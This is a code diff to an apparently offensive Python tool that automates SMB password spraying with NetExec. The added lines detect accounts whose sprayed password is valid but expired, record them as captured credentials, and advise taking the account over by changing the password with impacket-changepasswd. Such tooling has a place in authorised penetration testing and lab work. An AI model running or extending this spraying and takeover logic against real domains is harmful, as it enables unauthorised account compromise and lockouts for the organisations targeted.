@@ -1801,6 +1801,19 @@ def _spray_password(
             findings.cmd(f"nxc smb {ip} -u [spray_list:{len(spray_users)}] -p *** --continue-on-success --no-bruteforce")
             out = runner.run(cmd, f"{label_prefix}spray_smb_{safe_pw}", timeout=180)
             for line in out.splitlines():
+                if "STATUS_PASSWORD_MUST_CHANGE" in line:
+                    m = re.search(r"\\([^\s\\:]+):", line)
+                    if m:
+                        hit_user = m.group(1)
+                        ws.add_user(hit_user, authoritative=True)
+                        ws.add_cred(password)
+                        findings.bullet(
+                            f"**SPRAY: password valid but expired (SMB): `{hit_user}`** "
+                            "— change via `impacket-changepasswd -protocol rpc-samr`")
+                        findings.add_summary(
+                            f"Password must change: {hit_user} — valid but expired (SMB)")
+                        ui.good(f"SPRAY: {hit_user} — password valid but expired (must change)")
+                    continue
                 if "[+]" in line:
                     # nxc success: `DOMAIN\user:password` (may end the line, no
                     # trailing space) — capture just the user, anchored on the ':'.
